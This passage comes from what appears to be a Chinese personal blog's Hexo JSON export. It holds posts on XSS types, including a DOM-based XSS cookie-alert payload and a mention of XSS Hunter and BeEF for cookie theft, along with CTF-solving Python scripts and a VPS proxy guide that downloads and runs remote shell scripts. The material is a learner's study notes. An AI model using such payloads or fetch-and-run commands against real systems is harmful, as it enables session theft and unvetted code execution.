这段代码会生成一个实际并不存在的图片，图片地址里面包含了恶意代码的地址，这样代码便被浏览器执行了，客户信息将被事先编写的js获取并告知黑客。现如今互联网上遍布着各种公开的XSS Payload 模块，XSS 测试平台也很多，不想自己搭建的话可以直接使用，各平台大部分都是从GitHub上clone的大同小异，可以在项目管理界面实时查看成果。推荐一下国外的XSS Hunter ，这个平台可以把结果发送到你的邮箱，并且支持的注入方式很多，攻击模块也比较齐全，坏处就是国内访问延迟有点大，全英文会坑新人。有兴趣的话还是自己用kali搭个BeEF吧，谁用谁知道。 第三种：DOM Based XSS 实际上，这种类型的XSS并非按照“数据是否存储在服务器”来划分，DOM Based XSS 从效果上来说也是反射型XSS。只是因为其成因比较特殊，使用过修改页面的DOM节点来形成的XSS，称之为 DOM Based XSS。 12345678910&lt;script&gt;function fun()&#123; var str=document.getElementById(&quot;text&quot;).value; var d=document.getElementById(&quot;t&quot;).innerHTML=&quot;&lt;a herf=&apos; &quot;+str+&quot; &apos;&gt;link&lt;/a&gt;&quot;;&#125;&lt;/script&gt;&lt;div id=&quot;t&quot;&gt;&lt;/div&gt;&lt;input type=&quot;text&quot; id=&quot;text&quot; value=&quot;&quot; /&gt;&lt;input type=&quot;button&quot; id=&quot;s&quot; value=&quot;write&quot; onclick=&quot;fun()&quot; /&gt; 页面根据用户的输入生成一个链接，由于没有进行合法性检查，所以可以输入以下代码。 1&apos; onclick=alert(document.cookie) // 点击链接用户信息被输出。这里用到了闭合的技巧会在下一篇博文中讲到。 这是关于XSS的简单介绍，下篇中会结合题目说一些XSS攻击方式。","categories":[],"tags":[]},{"title":"XSS 随笔 02","slug":"XSS随笔02","date":"2019-04-08T02:53:36.445Z","updated":"2019-04-08T02:54:11.094Z","comments":true,"path":"2019/04/08/XSS随笔02/","link":"","permalink":"https://kkkiona.github.io/2019/04/08/XSS随笔02/","excerpt":"","text":"昨晚肝到两点总算是突破了防线，然而却因为漏了一个分号最后也没搞出来。今早上改好了，成功又解出来一道。干脆一鼓作气做完最后一道XSS再一起发步骤吧。","categories":[],"tags":[{"name":"随笔","slug":"随笔","permalink":"https://kkkiona.github.io/tags/随笔/"}]},{"title":"XSS 随笔","slug":"XSS 随笔01","date":"2019-04-07T12:54:48.258Z","updated":"2019-04-07T12:56:05.886Z","comments":true,"path":"2019/04/07/XSS 随笔01/","link":"","permalink":"https://kkkiona.github.io/2019/04/07/XSS 随笔01/","excerpt":"","text":"第一次遇到XSS的题目，由于做错了题目顺序，直接从第二道题做的，所以搞了一天多也没成功。多亏学长提示从第一题入门开始做，结果由于这两天的学习很快就完成了第一道题。使用的是XSS Hunter的payload抓的cookies。笔记还没整理，打算在努力一下把第二道题攻克以后一起发详细步骤，大体内容就是XSS的攻击方式，以及关于proof of work的一点知识吧。再次感谢学长！","categories":[],"tags":[{"name":"随笔","slug":"随笔","permalink":"https://kkkiona.github.io/tags/随笔/"}]},{"title":"VPS服务器搭建SSR/SS","slug":"VPS服务器搭建SSR_SS","date":"2019-04-06T06:02:53.301Z","updated":"2019-04-09T04:13:49.394Z","comments":true,"path":"2019/04/06/VPS服务器搭建SSR_SS/","link":"","permalink":"https://kkkiona.github.io/2019/04/06/VPS服务器搭建SSR_SS/","excerpt":"实在是忍受不了国内博客论坛千篇一律的抄袭现象，决定去翻阅一下国外的资料。但又因为国内现成的VPN基本全被封杀，即便是有几个可以用的也会收费并且非常不稳定，于是决定自己动手打一个梯子。服务器：vultr（比较实惠、稳定的国外服务器）工具：xshell、shadowstocks、bbr、代理服务设置工具（下边会给出链接）首先是搞到服务器，去vultr注册账号。https://www.vultr.com/填写邮箱和密码，会给你发个邮件激活账号。","text":"实在是忍受不了国内博客论坛千篇一律的抄袭现象，决定去翻阅一下国外的资料。但又因为国内现成的VPN基本全被封杀，即便是有几个可以用的也会收费并且非常不稳定，于是决定自己动手打一个梯子。服务器：vultr（比较实惠、稳定的国外服务器）工具：xshell、shadowstocks、bbr、代理服务设置工具（下边会给出链接）首先是搞到服务器，去vultr注册账号。https://www.vultr.com/填写邮箱和密码，会给你发个邮件激活账号。先进性账户充值，充值最低10美元起。倒数2、3分别是微信和支付宝，扫码支付就可以了。 选择服务器选一个适合你的（延迟低的服务器）推荐日本和美国。如果不清楚哪个延迟低可以去这里测试一下http://ga-us-ping.vultr.com/ms越低越好。 选择系统和机器由于我使用kali较多所以我选了Debian，无特殊需求选默认的CentOS就可以了。机器的话如果仅仅用来fan墙，最便宜的就足够了。 后面的选项对此次的目的来说没有意义，因此全部采用的默认，具体功能自行了解。最后点击下方deploy now。 这样我们就有了一台自己的海外服务器。点击你的服务器进入详页可以看到你服务器IP和用户名、密码。后边会用到。下载xshell 链接：https://pan.baidu.com/s/11FRT_RPIVZjyvMkjx-zYbA 提取码：ffki安装完毕后新建连接。名字随意，主机号就是你申请的副武器的IP，端口一般默认22，可以自己修改。点击确定并连接主机。输入服务器的用户名密码。连接服务器。如图表示连接成功。 输入 1wget -N --no-check-certificate https://raw.githubusercontent.com/hombo125/doubi/master/ssr.sh &amp;&amp; chmod +x ssr.sh &amp;&amp; bash ssr.sh 如果失败则先输入下面的指令再次运行上面的指令 1yum -y install wget 运行完成后出现如下提示，输入数字1安装ssr服务端输入端口和账号密码，端口的可选范围为60~65535。选择加密方式，输入对应数字即可，下面机几个操作的选择取决于个人，作者均采用默认设置。协议插件设置混淆（通过代理玩游戏推荐第一个速度快一些）设备限制空（回车）默认无限制，需要对访问速度加以限制的自己输入速率上限就行。下载文件安装完成后会显示相关信息，记得保存。若不慎关闭可以输入bash ssr.sh进入管理界面根据提示查看或者修改信息。重启服务器，可以再界面输入reboot也可以在你的vultr管理界面里重启。 安装BBR加速器，输入如下指令 123wget --no-check-certificate https://github.com/teddysun/across/raw/master/bbr.shchmod +x bbr.sh./bbr.sh 按任意键安装。完成后提示重启服务器选择Y或手动重启。重启后输入lsmod | grep bbr查看是否安装成功。如上图安装成功。 下载代理设置工具 链接：https://pan.baidu.com/s/1_68i7TxfdT4lv3Kupge2wQ 提取码：z8jh 把之前保存的ssr配置信息填上。 设置浏览器的代理服务，地址127.0.0.1端口1080。使用全局模式所有浏览器就都可以使用代理服务了。Chrome可以使用自己的SwitchyOmega插件来定制自己的代理服务，但是这个插件的官方链接也被墙了，这里给出一个离线下载https://chrome-extension-downloader.com/。使用很简单实在不懂就Baidu一下吧。 至此vps服务器搭建ssr/ss就完成了，效果。","categories":[],"tags":[]},{"title":"SVG 图片验证码解码","slug":"SVG 图片验证码解码","date":"2019-04-05T13:28:43.169Z","updated":"2019-04-09T04:13:19.304Z","comments":true,"path":"2019/04/05/SVG 图片验证码解码/","link":"","permalink":"https://kkkiona.github.io/2019/04/05/SVG 图片验证码解码/","excerpt":"环境：Python 3外部依赖：requests、bs4、BeautifulSoup、base64先看题目：题目类似于公式计算的那道题只是公式变成了图片验证码，所以关于爬虫和网页请求请看https://kkkiona.github.io/2019/04/05/Python%20%E7%AE%80%E5%8D%95%E7%9A%84%E7%BD%91%E9%A1%B5%E6%8A%93%E5%8F%96%E5%92%8C%E6%8F%90%E4%BA%A4%E8%A1%A8%E5%8D%95/下面是解题过程：查看网页代码是用SVG制作的图片并且采用了base64进行了加密。由于作者有一些canvas的使用经验，因此对SVG也有所了解，这里简单说一下。SVG是一种适量绘制技术，与HTML5的canvas技术相比最大的区别就是，canvas有与之关联的JavaScript API 但是SVG是通过xml来控制的。SVG的绘制质量运行速率也不如canvas，好处就是易于控制。后期我会发一篇详细的介绍。","text":"环境：Python 3外部依赖：requests、bs4、BeautifulSoup、base64先看题目：题目类似于公式计算的那道题只是公式变成了图片验证码，所以关于爬虫和网页请求请看https://kkkiona.github.io/2019/04/05/Python%20%E7%AE%80%E5%8D%95%E7%9A%84%E7%BD%91%E9%A1%B5%E6%8A%93%E5%8F%96%E5%92%8C%E6%8F%90%E4%BA%A4%E8%A1%A8%E5%8D%95/下面是解题过程：查看网页代码是用SVG制作的图片并且采用了base64进行了加密。由于作者有一些canvas的使用经验，因此对SVG也有所了解，这里简单说一下。SVG是一种适量绘制技术，与HTML5的canvas技术相比最大的区别就是，canvas有与之关联的JavaScript API 但是SVG是通过xml来控制的。SVG的绘制质量运行速率也不如canvas，好处就是易于控制。后期我会发一篇详细的介绍。回归主题，把这个图片单独拿出来看一下就是这个样子，可以看到URL的base64后面跟了一大堆乱码，这就是加密的xml文档，F12可以看到解密以后的样子，当然也可以通过各种解密工具查看。那么我们就有两种思路，第一种就是像这样靠浏览器来解码然后抓解码后的内容，如果这么做就完全变成抓包游戏了，所以我更推荐第二种本地解码。先抓取题目的原始页面，然后通过简单的字符切割获取那段乱码字符串，方法见上面链接，这里只给出代码： 123response = requests.get(url)soup = BeautifulSoup(response.text, &quot;html.parser&quot;)src = soup.find(&quot;img&quot;).get(&quot;src&quot;).split(&apos;,&apos;)[1] 接下来重点就是解码，使用base64包解码。 12import base64enc = base64.b64decode(src) 可以把解码后的内容打印输出看一下，会发现跟浏览器的显示一样这里就不放图片了。下面的内容就很简单了，上方连接使用的关键字提取方法一样，只需要把text标签里面的内容提取出来组和并提交就可以了。但是结果会发现提交的结果是Wrong。仔细观察图片和浏览器里的解码后的代码会发现text中字符的排列顺序并不是想要的顺序，如上代码的前两个字符是D u 但是图片是t S。原来图片中的字符顺序是根据x轴的位置决定的，那么我们就需要对获取的文本重新排序了。 鉴于我的Python学的跟shi一样（正在重学）所以以下内容仅供参考，比我方法好的比比皆是。 将解码的文件转换为BeautifulSoup对象 1soup = BeautifulSoup(enc, &quot;xml&quot;) 查找所有text标签并返回tag对象，将tag对象的x轴的值转换为int类，并且连同text里面的字符逐个付给一个空的list列表。 1234List = []for tag in soup.find_all(&apos;text&apos;): List.append([int(tag[&apos;x&apos;]), tag.string]) tag是soup.find()返回的对象类型，具体关于BeautifuSsoup的使用可以参考官文https://www.crummy.com/software/BeautifulSoup/bs4/doc.zh/ 接下来只需要使用list的排序功能就可以了，由于我把x的值作为了第一个属性所以无需指定排序关键字，放到第二个的话需要手动指定，步骤很简单自行搜索即可。 1List.sort() 可以输出看一下字符的顺序按照离x轴的距离拍好了。最后取出里面的字符组合起来就可以了。 1234getString = &quot;&quot;for c in List: getString += c[1] 剩下的就是提交了这里就不重复了。最后结果OK，最后完整代码 123456789101112131415161718192021222324252627282930313233import requestsfrom bs4 import BeautifulSoupimport base64url = &quot;http://example.com/&quot;response = requests.get(url)Cookies = response.cookiessoup = BeautifulSoup(response.text, &quot;html.parser&quot;)src = soup.find(&quot;img&quot;).get(&quot;src&quot;).split(&apos;,&apos;)[1]enc = base64.b64decode(src)soup = BeautifulSoup(enc, &quot;xml&quot;)List = []for tag in soup.find_all(&apos;text&apos;): List.append([int(tag[&apos;x&apos;]), tag.string])List.sort()getString = &quot;&quot;for c in List: getString += c[1]response = requests.get(url + &quot;?code=&quot; + getString, cookies = Cookies)print(response.text) 最最后附上Python的其他编码解码方式。转载：https://blog.csdn.net/five3/article/details/83626446","categories":[],"tags":[]},{"title":"Python 简单的网页抓取和提交表单","slug":"Python 简单的网页抓取和提交表单","date":"2019-04-05T12:43:39.996Z","updated":"2019-04-09T04:12:30.257Z","comments":true,"path":"2019/04/05/Python 简单的网页抓取和提交表单/","link":"","permalink":"https://kkkiona.github.io/2019/04/05/Python 简单的网页抓取和提交表单/","excerpt":"环境说明：Python 3外部依赖：requests、bs4、BeautifulSoup先看题目 题目很简单，就是限时计算给出的算式并提交。方法一、计算器一台。方法很简单只需要在1.5s内计算出结果再提交就行了，大约几千左右的APM就够了。方法二、使用网络爬虫。爬虫的话自然使用Python是最方便不过的，大体思路就是抓取公式-&gt;计算-&gt;提交。既然是做题那么首先第一步肯定是化简，做题最讨厌的不是不会做而是把1+1做成∞+∞。我们先多刷新几次页面看一下。","text":"环境说明：Python 3外部依赖：requests、bs4、BeautifulSoup先看题目 题目很简单，就是限时计算给出的算式并提交。方法一、计算器一台。方法很简单只需要在1.5s内计算出结果再提交就行了，大约几千左右的APM就够了。方法二、使用网络爬虫。爬虫的话自然使用Python是最方便不过的，大体思路就是抓取公式-&gt;计算-&gt;提交。既然是做题那么首先第一步肯定是化简，做题最讨厌的不是不会做而是把1+1做成∞+∞。我们先多刷新几次页面看一下。可以很明显看到公式采用的是x1+x2*x3-x4的固定格式。那这就简单多了，不需要判断运算符也不用修改运算顺序，直接省去了一个heap的工作量。再来看一下代码。可以看到表单使用Get传值，传递对象是自己。GET使用URL传递参数，来测试一下URL。提交前：提交后：可以看到answer的值被脚本通过URL捕获并显示相关内容。现在的工作具体为抓取抓取公式-&gt;计算-&gt;生成URL-&gt;提交先来完成前两步工作：新建一个py文件，引入抓包用的requests和分析HTML结构的bs4. 12import requestsfrom bs4 import BeautifulSoup 向指定页面发送GET请求并获取响应 1response = requests.get(&quot;http://example.com/&quot;) 得到的response响应可以以content（二进制流）、text（文本）等多种格式输出，作为文本的时候还可以指定编码格式。现以text格式输出一下看看结果。 1print(response.text) 毫无疑问我们成功抓到了页面内容。下面需要获取公式。 12345678soup = BeautifulSoup(response.text, &quot;html.parser&quot;)getString = soup.find(id=&quot;exp&quot;).stringSum = int(getString.split()[2])Sum *= int(getString.split()[4])Sum += int(getString.split()[0])Sum -= int(getString.split()[6]) 先把获取的文本转成BeautifulSoup对象，通过字符串截取和强制转换变成单个数字并计算。由于已经确定运算符和运算规则这里就容易很多。然后把答案插入到URL并发送GET请求 1response = requests.get(&quot;http://example.com/calculator/?answer=&quot; + &apos;%d&apos; % Sum) 然后你会发现提示问题页面还未建立，没有问题何来答案。简述一下HTTP请求的规则：HTTP请求的三次握手客户端向服务端发送syn=1，seq=client请求的ID;服务端向客户端发送syn=1,seq=服务端请求的ID,ack=客户端请求的ID+1;客户端向服务端发送syn=0,seq=客户端请求的ID+1,ack=服务端请求的ID+1,data\\data…所以简单来说就是HTTP向服务器发送请求时会有一个专属ID来让服务器和客户端保持连接，这个ID存在于cookies里面。如果不连同cookies发送给服务器，那么服务器就会认为是两个不同的客户发送的请求从而出现上面的错误。所以我们要做的是连同cookies一起发送。先从response里面获取cookies并保存。 1Cookies = response.cookies 修改二次请求 1response = requests.get(&quot;http://example.com/?answer=&quot; + &apos;%d&apos; % Sum, cookies=Cookies) 再来看一下结果成功！总结：这道题比较基础，简单的使用了Python的爬虫功能，主要是学习了HTTP请求的过程，关键在于cookies的传递。 忘记放出完整代码了，补上！ 123456789101112131415161718import requestsfrom bs4 import BeautifulSoupresponse = requests.get(&quot;http://123.207.149.64:23331/calculator/&quot;)Cookies = response.cookiessoup = BeautifulSoup(response.text, &quot;html.parser&quot;)getString = soup.find(id=&quot;exp&quot;).stringSum = int(getString.split()[2])Sum *= int(getString.split()[4])Sum += int(getString.split()[0])Sum -= int(getString.split()[6])response = requests.get(&quot;http://123.207.149.64:23331/calculator/?answer=&quot; + &apos;%d&apos; % Sum, cookies=Cookies)print(response.text) 后面打算写一篇关于POST传递的使用方式和详细的HTTP请求的相关知识","categories":[],"tags":[]},{"title":"关于Python的使用","slug":"关于Python的使用","date":"2019-04-04T08:35:03.172Z","updated":"2019-04-09T04:14:17.783Z","comments":true,"path":"2019/04/04/关于Python的使用/","link":"","permalink":"https://kkkiona.github.io/2019/04/04/关于Python的使用/","excerpt":"今天遇到了一道网络爬虫的题目，于是便重新拾起了N年前自己学习的Python 2，下面就说一下Python的相关问题。首先关于Python版本的问题，虽然Python 2 ，Python 3 都在更新，而且据统计显示有70%以上的作者仍在使用Python 2，但是真的非常强烈推荐Python 3。Python 3 不仅仅是对语法做了优化，而且对许多库做了改进、合并。比如Python 2 的urllib和urllib2 在Python 3 中合并为了urllib（其实都不如request）。总之Python 3 是非常值得使用的。下面是一些安装问题，你可以去官网下载Python 3并安装，https://www.python.org/ Python 3 的Windows安装包是可以勾选path环境变量的无需手动设置。但相比这样我更推荐使用 anaconda 集成包，里面包含了许多科学包及其依赖，同样是一键安装并且可以自动配置环境变量，https://www.anaconda.com/ 提供了 Python 2，Python 3 两个版本。关于编辑器，新手可以使用Thonny，十分小巧简洁的Python 编辑器，没有复杂的工程模块，打开软件写就完了，并且自带了Python环境无需提前安装Python即可使用，也可以自己配置解释器。缺点是功能相对较弱。https://thonny.org/","text":"今天遇到了一道网络爬虫的题目，于是便重新拾起了N年前自己学习的Python 2，下面就说一下Python的相关问题。首先关于Python版本的问题，虽然Python 2 ，Python 3 都在更新，而且据统计显示有70%以上的作者仍在使用Python 2，但是真的非常强烈推荐Python 3。Python 3 不仅仅是对语法做了优化，而且对许多库做了改进、合并。比如Python 2 的urllib和urllib2 在Python 3 中合并为了urllib（其实都不如request）。总之Python 3 是非常值得使用的。下面是一些安装问题，你可以去官网下载Python 3并安装，https://www.python.org/ Python 3 的Windows安装包是可以勾选path环境变量的无需手动设置。但相比这样我更推荐使用 anaconda 集成包，里面包含了许多科学包及其依赖，同样是一键安装并且可以自动配置环境变量，https://www.anaconda.com/ 提供了 Python 2，Python 3 两个版本。关于编辑器，新手可以使用Thonny，十分小巧简洁的Python 编辑器，没有复杂的工程模块，打开软件写就完了，并且自带了Python环境无需提前安装Python即可使用，也可以自己配置解释器。缺点是功能相对较弱。https://thonny.org/比较常见的是pyCharm，操作模式类似于eclipse，功能强大代，码高亮，自动填写做的很好。项目管理很方便，可以跨平台。可以很方便的管理库文件，添加外部依赖等等。提供了免费及收费两个版本。没什么大缺点，就是对外部包引入的搜索方式有时候会让人头大。明明项目里都显示有package了就是import不进来。https://www.jetbrains.com/pycharm/download/#section=windows另外推荐一个交互式笔记本，Jupyter notebook（又称IPython notebook）支持运行超过40种编程语言。安装教程十分简单。跨平台，实时代码编辑。缺点，关键词高亮很差，语法检测很弱，有时候错误语法照样可以运行。https://jupyter.org/对于热衷文本编辑器的人员可以使用sublime，另外C、Java程序员可以使用vs和eclipse。Linux推荐vim。关于同时使用Python 2 和 Python 3，如果确实需要两个环境的话。可以参考这篇文章https://www.cnblogs.com/zhengyihan1216/p/6011640.html简述一下就是安装第一个Python的时候记得把Python.exe改个别名，并且使用pip的时候要对应Python版本，最后分别添加path就可以了。下一篇介绍如何简单的使用 requests package抓取页面和表单提交。","categories":[],"tags":[]},{"title":"First Article","slug":"first blog","date":"2019-04-03T12:24:54.992Z","updated":"2019-04-04T13:05:50.753Z","comments":true,"path":"2019/04/03/first blog/","link":"","permalink":"https://kkkiona.github.io/2019/04/03/first blog/","excerpt":"","text":"早上看了一下之前的Github实在是不忍直视还是重新制作一个吧。使用的是hexo搭建的博客，步骤比较简单。但是在themes选择上真的是强迫症患者的噩梦。偏偏就喜欢上了一个已经停止维护的yilia主题，尝试了无数次修改buffer大小之后依然无法使用HTTP下载，还是ssh吧。下载下来之后更是bug一大堆，比如tag。修改了半天总算是基本正常了。 既然是新做的博客必须好好搞一下，从网易云拉了音乐，另外搞了一下午的图灵机器人，而且失败了。。其实hexo 是自带Live2D功能的，但是想做一个高大上的带交友功能的机器人。然而node.js不熟悉挂接图灵接口的时候就是不行，最后无奈先用自带的吧。明天开始研究信息安全。有时间再搞图灵。。","categories":[],"tags":[{"name":"随笔","slug":"随笔","permalink":"https://kkkiona.github.io/tags/随笔/"}]},{"title":"Hello World","slug":"hello-world","date":"2019-04-03T03:37:59.399Z","updated":"2019-04-03T03:37:59.399Z","comments":true,"path":"2019/04/03/hello-world/","link":"","permalink":"https://kkkiona.github.io/2019/04/03/hello-world/","excerpt":"","text":"Welcome to Hexo! This is your very first post. Check documentation for more info. If you get any problems when using Hexo, you can find the answer in troubleshooting or you can ask me on GitHub. Quick StartCreate a new post1$ hexo new \"My New Post\" More info: Writing Run server1$ hexo server More info: Server Generate static files1$ hexo generate More info: Generating Deploy to remote sites1$ hexo deploy More info: Deployment","categories":[],"tags":[]}]}